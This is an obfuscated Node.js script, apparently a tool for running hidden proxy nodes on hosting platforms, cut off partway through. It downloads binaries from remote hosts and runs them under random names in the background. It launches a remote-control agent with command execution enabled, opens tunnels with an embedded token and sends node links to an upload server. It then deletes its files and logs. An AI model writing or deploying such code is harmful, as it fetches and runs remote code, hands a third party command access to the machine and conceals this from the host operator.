const _0x19274e=_0x1b8d;(function(_0x79a08f,_0x1d44fa){const _0x5769a8=_0x1b8d,_0x3331c7=_0x79a08f();while(!![]){try{const _0x1b7683=-parseInt(_0x5769a8(0x1b5))/0x1*(-parseInt(_0x5769a8(0x171))/0x2)+parseInt(_0x5769a8(0x20d))/0x3*(parseInt(_0x5769a8(0x1fb))/0x4)+parseInt(_0x5769a8(0x1ff))/0x5*(-parseInt(_0x5769a8(0x1b7))/0x6)+-parseInt(_0x5769a8(0x1dd))/0x7+parseInt(_0x5769a8(0x1ec))/0x8+parseInt(_0x5769a8(0x1d6))/0x9+-parseInt(_0x5769a8(0x237))/0xa*(parseInt(_0x5769a8(0x1bb))/0xb);if(_0x1b7683===_0x1d44fa)break;else _0x3331c7['push'](_0x3331c7['shift']());}catch(_0x34c173){_0x3331c7['push'](_0x3331c7['shift']());}}}(_0x4984,0x995a8));function _0x1b8d(_0x31123f,_0x312889){_0x31123f=_0x31123f-0x167;const _0x4984d4=_0x4984();let _0x1b8df1=_0x4984d4[_0x31123f];return _0x1b8df1;}const express=require(_0x19274e(0x206)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x19274e(0x228)),{promisify}=require('util'),exec=promisify(require(_0x19274e(0x1e2))[_0x19274e(0x16a)]),{execSync}=require(_0x19274e(0x1e2)),UPLOAD_URL=process['env'][_0x19274e(0x18a)]||'',PROJECT_URL=process[_0x19274e(0x226)]['PROJECT_URL']||'',AUTO_ACCESS=process['env']['AUTO_ACCESS']||![],FILE_PATH=process['env'][_0x19274e(0x1d8)]||'./tmp',SUB_PATH=process[_0x19274e(0x226)][_0x19274e(0x1fd)]||_0x19274e(0x1ee),PORT=process['env'][_0x19274e(0x175)]||process[_0x19274e(0x226)][_0x19274e(0x16d)]||0xbb8,UUID=process['env'][_0x19274e(0x16f)]||_0x19274e(0x1e6),NEZHA_SERVER=process[_0x19274e(0x226)][_0x19274e(0x212)]||'',NEZHA_PORT=process['env'][_0x19274e(0x236)]||'',NEZHA_KEY=process['env'][_0x19274e(0x1fe)]||'',ARGO_DOMAIN=process[_0x19274e(0x226)][_0x19274e(0x1c7)]||_0x19274e(0x1be),ARGO_AUTH=process[_0x19274e(0x226)][_0x19274e(0x218)]||_0x19274e(0x205),ARGO_PORT=process['env'][_0x19274e(0x16b)]||0x1f41,CFIP=process[_0x19274e(0x226)][_0x19274e(0x1a1)]||_0x19274e(0x1d4),CFPORT=process[_0x19274e(0x226)][_0x19274e(0x168)]||0x1bb,NAME=process[_0x19274e(0x226)][_0x19274e(0x214)]||_0x19274e(0x192);!fs['existsSync'](FILE_PATH)?(fs[_0x19274e(0x1c1)](FILE_PATH),console['log'](FILE_PATH+_0x19274e(0x210))):console[_0x19274e(0x1a9)](FILE_PATH+_0x19274e(0x1b8));function generateRandomName(){const _0x5a50d0=_0x19274e,_0x4c402d=_0x5a50d0(0x196);let _0xd05986='';for(let _0x5ad446=0x0;_0x5ad446<0x6;_0x5ad446++){_0xd05986+=_0x4c402d[_0x5a50d0(0x17b)](Math['floor'](Math[_0x5a50d0(0x1f9)]()*_0x4c402d[_0x5a50d0(0x1a7)]));}return _0xd05986;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();function _0x4984(){const _0x361b70=['8443','from','cdn.qmqm.cf','&fp=firefox&type=ws&host=','1215135lxQGZb','freedom','FILE_PATH','Error\x20downloading\x20files:','toString','pkill\x20-f\x20\x22[','config.yaml','7395738reafmi','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','\x20>\x20nul\x202>&1','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','\x20-s\x20','child_process','2083','test','direct','9b514ba6-f207-4fd2-9461-6a46842e833a','application/json','list.txt','Add\x20automatic\x20access\x20task\x20faild:\x20','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','base64','3174104yVFqgf','TunnelSecret','sub','/vmess-argo','then','http://ip-api.com/json/','&path=%2Ftrojan-argo%3Fed%3D2560#','web\x20running\x20error:\x20','\x20is\x20running','country_code','firefox','unshift','\x20-p\x20','random','Error\x20executing\x20command:\x20','176108dyQfCU','pop','SUB_PATH','NEZHA_KEY','325NwFVdo','split','statSync','2087','/api/delete-nodes','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','eyJhIjoiMDczOWQ0M2NhYmE5ZmYyYmExMmI4ZDUzYWZhZDBlMmIiLCJ0IjoiMTE2YzljNTAtNzk3ZS00ZjAxLWJmOWMtNzMyMWE2OTFjNmNjIiwicyI6IlkySTVOelEwWlRVdE5EbGpZeTAwT0RnM0xUazRabUV0WWpnNU5qa3daRFUwTmpsaSJ9','express','ArgoDomain:','match','/vmess-argo?ed=2560','https://ipapi.co/json/','finish','win32','60KbEBDK','all','\x0aclient_secret:\x20','\x20is\x20created','existsSync','NEZHA_SERVER','aarch64','NAME','/trojan-argo','unlink','send','ARGO_AUTH','\x0a\x20\x20tunnel:\x20','tunnel.json','&path=%2Fvless-argo%3Fed%3D2560#','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','\x20-c\x20\x22','App\x20is\x20running','Error\x20in\x20startserver:','error','Content-Type','has','?encryption=none&security=tls&sni=','config.json','https://amd64.ssss.nyc.mn/web','env','countryCode','path','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','\x0a\x20\x20credentials-file:\x20','set','tcp','org','filter','php\x20running\x20error:\x20','createWriteStream','writeFileSync','Empowerment\x20success\x20for\x20','arm64','pipe','/vless-argo','NEZHA_PORT','1163810GBjuJV','127.0.0.1','CFPORT','Skipping\x20adding\x20automatic\x20access\x20task','exec','ARGO_PORT','get','PORT','--tls','UUID','https+local://8.8.8.8/dns-query','2eownYn','\x20-c\x20','amd','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','SERVER_PORT','substring','\x0avless://','arch','ARGO_DOMAIN:','NEZHA\x20variable\x20is\x20empty,skip\x20running','charAt','boot.log','listen','quic','block','stream','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','Nodes\x20uploaded\x20successfully','success','catch','isFile','rm\x20-rf\x20','vless','\x20>/dev/null\x202>&1','join','UPLOAD_URL','utf-8','/api/add-subscriptions','.exe\x20>\x20nul\x202>&1','https://amd64.ssss.nyc.mn/v1','push','\x20>/dev/null\x202>&1\x20&','xtls-rprx-vision','leahk','close','2096','/tunnel.yml\x20run','abcdefghijklmnopqrstuvwxyz','https://amd64.ssss.nyc.mn/bot','nohup\x20','https://arm64.ssss.nyc.mn/v1','blackhole','includes','fileUrl','Unknown','readFileSync','status','Download\x20','CFIP','arm','\x20failed:\x20','/dev/null','443','none','length','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','log','tls','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','basename','?security=tls&sni=','unlinkSync','Hello\x20world!','chmod','https://arm64.ssss.nyc.mn/web','\x0a\x0avmess://','response','1090603OkAWVI','post','64788IViIac','\x20already\x20exists','data','message','11eoEyuP','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','stringify','leahk1.qmqm.cf','sub.txt','https://arm64.ssss.nyc.mn/agent','mkdirSync','\x20successfully','true','clear','Empowerment\x20failed\x20for\x20','trojan','ARGO_DOMAIN','/api/add-nodes','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','2053','https://oooo.serv00.net/add-url','http','readdirSync','https://arm64.ssss.nyc.mn/bot','automatic\x20access\x20task\x20added\x20successfully','forEach','\x0a\x0atrojan://'];_0x4984=function(){return _0x361b70;};return _0x4984();}let npmPath=path[_0x19274e(0x189)](FILE_PATH,npmName),phpPath=path[_0x19274e(0x189)](FILE_PATH,phpName),webPath=path[_0x19274e(0x189)](FILE_PATH,webName),botPath=path[_0x19274e(0x189)](FILE_PATH,botName),subPath=path[_0x19274e(0x189)](FILE_PATH,_0x19274e(0x1bf)),listPath=path[_0x19274e(0x189)](FILE_PATH,_0x19274e(0x1e8)),bootLogPath=path[_0x19274e(0x189)](FILE_PATH,_0x19274e(0x17c)),configPath=path[_0x19274e(0x189)](FILE_PATH,_0x19274e(0x224));function deleteNodes(){const _0x3e4782=_0x19274e;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0xb27770;try{_0xb27770=fs[_0x3e4782(0x19e)](subPath,_0x3e4782(0x18b));}catch{return null;}const _0x40c77a=Buffer[_0x3e4782(0x1d3)](_0xb27770,'base64')[_0x3e4782(0x1da)](_0x3e4782(0x18b)),_0x5bb87a=_0x40c77a[_0x3e4782(0x200)]('\x0a')[_0x3e4782(0x22e)](_0x310854=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x310854));if(_0x5bb87a[_0x3e4782(0x1a7)]===0x0)return;return axios['post'](UPLOAD_URL+_0x3e4782(0x203),JSON['stringify']({'nodes':_0x5bb87a}),{'headers':{'Content-Type':'application/json'}})['catch'](_0x13cff5=>{return null;}),null;}catch(_0x480dad){return null;}}function cleanupOldFiles(){const _0x415276=_0x19274e;try{const _0x20e749=fs[_0x415276(0x1cd)](FILE_PATH);_0x20e749[_0x415276(0x1d0)](_0x59adbe=>{const _0x225815=_0x415276,_0x4e8300=path[_0x225815(0x189)](FILE_PATH,_0x59adbe);try{const _0x50c434=fs[_0x225815(0x201)](_0x4e8300);_0x50c434[_0x225815(0x185)]()&&fs[_0x225815(0x1af)](_0x4e8300);}catch(_0x4bbc49){}});}catch(_0xc75b72){}}app[_0x19274e(0x16c)]('/',function(_0x285c36,_0x2407d8){const _0xc93f8=_0x19274e;_0x2407d8[_0xc93f8(0x217)](_0xc93f8(0x1b0));});async function generateConfig(){const _0x43ad9e=_0x19274e,_0x171653={'log':{'access':_0x43ad9e(0x1a4),'error':_0x43ad9e(0x1a4),'loglevel':_0x43ad9e(0x1a6)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x43ad9e(0x187),'settings':{'clients':[{'id':UUID,'flow':_0x43ad9e(0x191)}],'decryption':_0x43ad9e(0x1a6),'fallbacks':[{'dest':0xbb9},{'path':_0x43ad9e(0x235),'dest':0xbba},{'path':_0x43ad9e(0x1ef),'dest':0xbbb},{'path':_0x43ad9e(0x215),'dest':0xbbc}]},'streamSettings':{'network':_0x43ad9e(0x22c)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x43ad9e(0x187),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x43ad9e(0x22c),'security':'none'}},{'port':0xbba,'listen':_0x43ad9e(0x167),'protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x43ad9e(0x1a6)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x43ad9e(0x1cc),_0x43ad9e(0x1aa),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x43ad9e(0x167),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x43ad9e(0x1ef)}},'sniffing':{'enabled':!![],'destOverride':[_0x43ad9e(0x1cc),_0x43ad9e(0x1aa),_0x43ad9e(0x17e)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x43ad9e(0x167),'protocol':_0x43ad9e(0x1c6),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x43ad9e(0x1a6),'wsSettings':{'path':_0x43ad9e(0x215)}},'sniffing':{'enabled':!![],'destOverride':[_0x43ad9e(0x1cc),'tls',_0x43ad9e(0x17e)],'metadataOnly':![]}}],'dns':{'servers':[_0x43ad9e(0x170)]},'outbounds':[{'protocol':_0x43ad9e(0x1d7),'tag':_0x43ad9e(0x1e5)},{'protocol':_0x43ad9e(0x19a),'tag':_0x43ad9e(0x17f)}]};fs[_0x43ad9e(0x231)](path[_0x43ad9e(0x189)](FILE_PATH,'config.json'),JSON[_0x43ad9e(0x1bd)](_0x171653,null,0x2));}function getSystemArchitecture(){const _0x1f5b3a=_0x19274e,_0x2e6725=os[_0x1f5b3a(0x178)]();return _0x2e6725===_0x1f5b3a(0x1a2)||_0x2e6725===_0x1f5b3a(0x233)||_0x2e6725===_0x1f5b3a(0x213)?_0x1f5b3a(0x1a2):_0x1f5b3a(0x173);}function downloadFile(_0x27c6b9,_0x5abeeb,_0x1ba291){const _0x5e09be=_0x19274e,_0x55ee19=_0x27c6b9;!fs['existsSync'](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x564aa6=fs[_0x5e09be(0x230)](_0x55ee19);axios({'method':_0x5e09be(0x16c),'url':_0x5abeeb,'responseType':_0x5e09be(0x180)})[_0x5e09be(0x1f0)](_0x2932b7=>{const _0x1a40da=_0x5e09be;_0x2932b7['data'][_0x1a40da(0x234)](_0x564aa6),_0x564aa6['on'](_0x1a40da(0x20b),()=>{const _0x2c3217=_0x1a40da;_0x564aa6[_0x2c3217(0x193)](),console[_0x2c3217(0x1a9)]('Download\x20'+path[_0x2c3217(0x1ad)](_0x55ee19)+_0x2c3217(0x1c2)),_0x1ba291(null,_0x55ee19);}),_0x564aa6['on'](_0x1a40da(0x220),_0x48ab46=>{const _0x4ca841=_0x1a40da;fs[_0x4ca841(0x216)](_0x55ee19,()=>{});const _0x4974dc=_0x4ca841(0x1a0)+path['basename'](_0x55ee19)+_0x4ca841(0x1a3)+_0x48ab46[_0x4ca841(0x1ba)];console[_0x4ca841(0x220)](_0x4974dc),_0x1ba291(_0x4974dc);});})[_0x5e09be(0x184)](_0x23ce80=>{const _0x1fa8e9=_0x5e09be,_0x192e17=_0x1fa8e9(0x1a0)+path['basename'](_0x55ee19)+'\x20failed:\x20'+_0x23ce80['message'];console[_0x1fa8e9(0x220)](_0x192e17),_0x1ba291(_0x192e17);});}async function downloadFilesAndRun(){const _0x4ec6c9=_0x19274e,_0xb6fe0=getSystemArchitecture(),_0x134efb=getFilesForArchitecture(_0xb6fe0);if(_0x134efb[_0x4ec6c9(0x1a7)]===0x0){console[_0x4ec6c9(0x1a9)](_0x4ec6c9(0x1ea));return;}const _0x12e6f8=_0x134efb['map'](_0x66fff1=>{return new Promise((_0x2cfcbd,_0x264b6a)=>{const _0x169470=_0x1b8d;downloadFile(_0x66fff1['fileName'],_0x66fff1[_0x169470(0x19c)],(_0x144283,_0x34eca4)=>{_0x144283?_0x264b6a(_0x144283):_0x2cfcbd(_0x34eca4);});});});try{await Promise[_0x4ec6c9(0x20e)](_0x12e6f8);}catch(_0x5b5cb8){console['error'](_0x4ec6c9(0x1d9),_0x5b5cb8);return;}function _0x3d97e0(_0x3bd274){const _0x38f311=_0x4ec6c9,_0x3fc85d=0x1fd;_0x3bd274[_0x38f311(0x1d0)](_0xea4069=>{const _0x253d0d=_0x38f311;fs['existsSync'](_0xea4069)&&fs[_0x253d0d(0x1b1)](_0xea4069,_0x3fc85d,_0x150d21=>{const _0x1a588a=_0x253d0d;_0x150d21?console['error'](_0x1a588a(0x1c5)+_0xea4069+':\x20'+_0x150d21):console[_0x1a588a(0x1a9)](_0x1a588a(0x232)+_0xea4069+':\x20'+_0x3fc85d[_0x1a588a(0x1da)](0x8));});});}const _0x204cad=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x3d97e0(_0x204cad);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x4fb267=NEZHA_SERVER[_0x4ec6c9(0x19b)](':')?NEZHA_SERVER[_0x4ec6c9(0x200)](':')[_0x4ec6c9(0x1fc)]():'',_0x2fd5a9=new Set([_0x4ec6c9(0x1a5),'8443',_0x4ec6c9(0x194),_0x4ec6c9(0x202),_0x4ec6c9(0x1e3),_0x4ec6c9(0x1ca)]),_0x12463e=_0x2fd5a9[_0x4ec6c9(0x222)](_0x4fb267)?_0x4ec6c9(0x1c3):'false',_0x251fc9=_0x4ec6c9(0x20f)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x4ec6c9(0x1bc)+_0x12463e+_0x4ec6c9(0x229)+UUID;fs[_0x4ec6c9(0x231)](path['join'](FILE_PATH,_0x4ec6c9(0x1dc)),_0x251fc9);const _0x59078e=_0x4ec6c9(0x198)+phpPath+_0x4ec6c9(0x21d)+FILE_PATH+_0x4ec6c9(0x1de);try{await exec(_0x59078e),console[_0x4ec6c9(0x1a9)](phpName+_0x4ec6c9(0x1f4)),await new Promise(_0x3878d6=>setTimeout(_0x3878d6,0x3e8));}catch(_0x363acb){console[_0x4ec6c9(0x220)](_0x4ec6c9(0x22f)+_0x363acb);}}else{let _0x588817='';const _0x4064fa=[_0x4ec6c9(0x1a5),_0x4ec6c9(0x1d2),_0x4ec6c9(0x194),_0x4ec6c9(0x202),'2083',_0x4ec6c9(0x1ca)];_0x4064fa[_0x4ec6c9(0x19b)](NEZHA_PORT)&&(_0x588817=_0x4ec6c9(0x16e));const _0xe86aa1=_0x4ec6c9(0x198)+npmPath+_0x4ec6c9(0x1e1)+NEZHA_SERVER+':'+NEZHA_PORT+_0x4ec6c9(0x1f8)+NEZHA_KEY+'\x20'+_0x588817+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0xe86aa1),console[_0x4ec6c9(0x1a9)](npmName+'\x20is\x20running'),await new Promise(_0x2d9d29=>setTimeout(_0x2d9d29,0x3e8));}catch(_0x758078){console[_0x4ec6c9(0x220)]('npm\x20running\x20error:\x20'+_0x758078);}}}else console[_0x4ec6c9(0x1a9)](_0x4ec6c9(0x17a));const _0x462c50=_0x4ec6c9(0x198)+webPath+_0x4ec6c9(0x172)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x462c50),console['log'](webName+'\x20is\x20running'),await new Promise(_0x34b5bc=>setTimeout(_0x34b5bc,0x3e8));}catch(_0x3e6768){console[_0x4ec6c9(0x220)](_0x4ec6c9(0x1f3)+_0x3e6768);}if(fs['existsSync'](botPath)){let _0x59a43a;if(ARGO_AUTH[_0x4ec6c9(0x208)](/^[A-Z0-9a-z=]{120,250}$/))_0x59a43a=_0x4ec6c9(0x181)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x59a43a=_0x4ec6c9(0x204)+FILE_PATH+_0x4ec6c9(0x195):_0x59a43a=_0x4ec6c9(0x1ac)+FILE_PATH+_0x4ec6c9(0x1c9)+ARGO_PORT;try{await exec(_0x4ec6c9(0x198)+botPath+'\x20'+_0x59a43a+_0x4ec6c9(0x190)),console[_0x4ec6c9(0x1a9)](botName+'\x20is\x20running'),await new Promise(_0x3d8e34=>setTimeout(_0x3d8e34,0x7d0));}catch(_0x3a88bb){console['error'](_0x4ec6c9(0x1fa)+_0x3a88bb);}}await new Promise(_0x58389f=>setTimeout(_0x58389f,0x1388));}function getFilesForArchitecture(_0x4b8242){const _0x37493a=_0x19274e;let _0x1cf6d2;_0x4b8242===_0x37493a(0x1a2)?_0x1cf6d2=[{'fileName':webPath,'fileUrl':_0x37493a(0x1b2)},{'fileName':botPath,'fileUrl':_0x37493a(0x1ce)}]:_0x1cf6d2=[{'fileName':webPath,'fileUrl':_0x37493a(0x225)},{'fileName':botPath,'fileUrl':_0x37493a(0x197)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x2be16b=_0x4b8242===_0x37493a(0x1a2)?_0x37493a(0x1c0):'https://amd64.ssss.nyc.mn/agent';_0x1cf6d2['unshift']({'fileName':npmPath,'fileUrl':_0x2be16b});}else{const _0x1f03a9=_0x4b8242===_0x37493a(0x1a2)?_0x37493a(0x199):_0x37493a(0x18e);_0x1cf6d2[_0x37493a(0x1f7)]({'fileName':phpPath,'fileUrl':_0x1f03a9});}}return _0x1cf6d2;}function argoType(){const _0x163fd=_0x19274e;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x163fd(0x1a9)](_0x163fd(0x1e0));return;}if(ARGO_AUTH['includes'](_0x163fd(0x1ed))){fs[_0x163fd(0x231)](path['join'](FILE_PATH,_0x163fd(0x21a)),ARGO_AUTH);const _0x2a29d2=_0x163fd(0x219)+ARGO_AUTH['split']('\x22')[0xb]+_0x163fd(0x22a)+path[_0x163fd(0x189)](FILE_PATH,_0x163fd(0x21a))+_0x163fd(0x1a8)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x163fd(0x231)](path[_0x163fd(0x189)](FILE_PATH,'tunnel.yml'),_0x2a29d2);}else console[_0x163fd(0x1a9)](_0x163fd(0x174));}async function extractDomains(){const _0x4ee3d6=_0x19274e;let _0x29ae02;if(ARGO_AUTH&&ARGO_DOMAIN)_0x29ae02=ARGO_DOMAIN,console['log'](_0x4ee3d6(0x179),_0x29ae02),await _0x3c3013(_0x29ae02);else try{const _0x365210=fs[_0x4ee3d6(0x19e)](path['join'](FILE_PATH,_0x4ee3d6(0x17c)),_0x4ee3d6(0x18b)),_0x1a6a06=_0x365210['split']('\x0a'),_0x386440=[];_0x1a6a06[_0x4ee3d6(0x1d0)](_0x2d127d=>{const _0x5a8483=_0x4ee3d6,_0x5053f4=_0x2d127d[_0x5a8483(0x208)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x5053f4){const _0x201657=_0x5053f4[0x1];_0x386440[_0x5a8483(0x18f)](_0x201657);}});if(_0x386440[_0x4ee3d6(0x1a7)]>0x0)_0x29ae02=_0x386440[0x0],console[_0x4ee3d6(0x1a9)](_0x4ee3d6(0x207),_0x29ae02),await _0x3c3013(_0x29ae02);else{console[_0x4ee3d6(0x1a9)](_0x4ee3d6(0x21c)),fs['unlinkSync'](path[_0x4ee3d6(0x189)](FILE_PATH,_0x4ee3d6(0x17c)));async function _0x2f88a8(){const _0x146fdf=_0x4ee3d6;try{process['platform']===_0x146fdf(0x20c)?await exec('taskkill\x20/f\x20/im\x20'+botName+_0x146fdf(0x18d)):await exec(_0x146fdf(0x1db)+botName[_0x146fdf(0x17b)](0x0)+']'+botName[_0x146fdf(0x176)](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x4f0ade){}}_0x2f88a8(),await new Promise(_0x638778=>setTimeout(_0x638778,0xbb8));const _0x4cc5fa=_0x4ee3d6(0x1ac)+FILE_PATH+_0x4ee3d6(0x1c9)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x4cc5fa+_0x4ee3d6(0x190)),console[_0x4ee3d6(0x1a9)](botName+'\x20is\x20running'),await new Promise(_0x1c8178=>setTimeout(_0x1c8178,0xbb8)),await extractDomains();}catch(_0x1b1723){console[_0x4ee3d6(0x220)](_0x4ee3d6(0x1fa)+_0x1b1723);}}}catch(_0xb5fdd4){console[_0x4ee3d6(0x220)]('Error\x20reading\x20boot.log:',_0xb5fdd4);}async function _0x4dda71(){const _0x31f01a=_0x4ee3d6;try{const _0x21c8e9=await axios[_0x31f01a(0x16c)](_0x31f01a(0x20a),{'timeout':0xbb8});if(_0x21c8e9[_0x31f01a(0x1b9)]&&_0x21c8e9[_0x31f01a(0x1b9)][_0x31f01a(0x1f5)]&&_0x21c8e9[_0x31f01a(0x1b9)][_0x31f01a(0x22d)])return _0x21c8e9[_0x31f01a(0x1b9)]['country_code']+'_'+_0x21c8e9['data'][_0x31f01a(0x22d)];}catch(_0x49aa64){try{const _0x473099=await axios[_0x31f01a(0x16c)](_0x31f01a(0x1f1),{'timeout':0xbb8});if(_0x473099[_0x31f01a(0x1b9)]&&_0x473099[_0x31f01a(0x1b9)][_0x31f01a(0x19f)]===_0x31f01a(0x183)&&_0x473099['data'][_0x31f01a(0x227)]&&_0x473099[_0x31f01a(0x1b9)][_0x31f01a(0x22d)])return _0x473099['data'][_0x31f01a(0x227)]+'_'+_0x473099[_0x31f01a(0x1b9)][_0x31f01a(0x22d)];}catch(_0x33143a){}}return _0x31f01a(0x19d);}async function _0x3c3013(_0x4d3bda){const _0x21adf5=await _0x4dda71(),_0x2dd97d=NAME?NAME+'-'+_0x21adf5:_0x21adf5;return new Promise(_0x5d3c7b=>{setTimeout(()=>{const _0x7dd551=_0x1b8d,_0x4aa983={'v':'2','ps':''+_0x2dd97d,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x7dd551(0x1a6),'net':'ws','type':'none','host':_0x4d3bda,'path':_0x7dd551(0x209),'tls':_0x7dd551(0x1aa),'sni':_0x4d3bda,'alpn':'','fp':_0x7dd551(0x1f6)},_0x30b460=_0x7dd551(0x177)+UUID+'@'+CFIP+':'+CFPORT+_0x7dd551(0x223)+_0x4d3bda+'&fp=firefox&type=ws&host='+_0x4d3bda+_0x7dd551(0x21b)+_0x2dd97d+_0x7dd551(0x1b3)+Buffer[_0x7dd551(0x1d3)](JSON[_0x7dd551(0x1bd)](_0x4aa983))['toString'](_0x7dd551(0x1eb))+_0x7dd551(0x1d1)+UUID+'@'+CFIP+':'+CFPORT+_0x7dd551(0x1ae)+_0x4d3bda+_0x7dd551(0x1d5)+_0x4d3bda+_0x7dd551(0x1f2)+_0x2dd97d+'\x0a\x20\x20\x20\x20';console[_0x7dd551(0x1a9)](Buffer[_0x7dd551(0x1d3)](_0x30b460)['toString']('base64')),fs['writeFileSync'](subPath,Buffer[_0x7dd551(0x1d3)](_0x30b460)[_0x7dd551(0x1da)](_0x7dd551(0x1eb))),console['log'](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x7dd551(0x16c)]('/'+SUB_PATH,(_0x6e3d81,_0x53e514)=>{const _0x41ad9e=_0x7dd551,_0x2662b3=Buffer[_0x41ad9e(0x1d3)](_0x30b460)[_0x41ad9e(0x1da)]('base64');_0x53e514[_0x41ad9e(0x22b)](_0x41ad9e(0x221),'text/plain;\x20charset=utf-8'),_0x53e514[_0x41ad9e(0x217)](_0x2662b3);}),_0x5d3c7b(_0x30b460);},0x7d0);});}}async function uploadNodes(){const _0x192bbf=_0x19274e;if(UPLOAD_URL&&PROJECT_URL){const _0xbb447f=PROJECT_URL+'/'+SUB_PATH,_0x2c7e7c={'subscription':[_0xbb447f]};try{const _0x35dd2a=await axios[_0x192bbf(0x1b6)](UPLOAD_URL+_0x192bbf(0x18c),_0x2c7e7c,{'headers':{'Content-Type':_0x192bbf(0x1e7)}});return _0x35dd2a&&_0x35dd2a[_0x192bbf(0x19f)]===0xc8?(console[_0x192bbf(0x1a9)]('Subscription\x20uploaded\x20successfully'),_0x35dd2a):null;}catch(_0x5e7ef3){if(_0x5e7ef3[_0x192bbf(0x1b4)]){if(_0x5e7ef3[_0x192bbf(0x1b4)][_0x192bbf(0x19f)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x192bbf(0x211)](listPath))return;const _0x5282f8=fs[_0x192bbf(0x19e)](listPath,_0x192bbf(0x18b)),_0xc96661=_0x5282f8[_0x192bbf(0x200)]('\x0a')[_0x192bbf(0x22e)](_0xa3ec4c=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x192bbf(0x1e4)](_0xa3ec4c));if(_0xc96661[_0x192bbf(0x1a7)]===0x0)return;const _0x1e4d70=JSON[_0x192bbf(0x1bd)]({'nodes':_0xc96661});try{const _0x498cdc=await axios['post'](UPLOAD_URL+_0x192bbf(0x1c8),_0x1e4d70,{'headers':{'Content-Type':_0x192bbf(0x1e7)}});return _0x498cdc&&_0x498cdc[_0x192bbf(0x19f)]===0xc8?(console[_0x192bbf(0x1a9)](_0x192bbf(0x182)),_0x498cdc):null;}catch(_0x403847){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x226d28=_0x1b8d,_0xe5166=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0xe5166['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0xe5166[_0x226d28(0x18f)](phpPath);process['platform']===_0x226d28(0x20c)?exec('del\x20/f\x20/q\x20'+_0xe5166[_0x226d28(0x189)]('\x20')+_0x226d28(0x1df),_0x5416a3=>{const _0x80469c=_0x226d28;console[_0x80469c(0x1c4)](),console[_0x80469c(0x1a9)](_0x80469c(0x21e)),console['log'](_0x80469c(0x1ab));}):exec(_0x226d28(0x186)+_0xe5166[_0x226d28(0x189)]('\x20')+_0x226d28(0x188),_0x1fcd80=>{const _0x5c7ada=_0x226d28;console[_0x5c7ada(0x1c4)](),console[_0x5c7ada(0x1a9)]('App\x20is\x20running'),console[_0x5c7ada(0x1a9)](_0x5c7ada(0x1ab));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x3a07f5=_0x19274e;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x3a07f5(0x1a9)](_0x3a07f5(0x169));return;}try{const _0x818d46=await 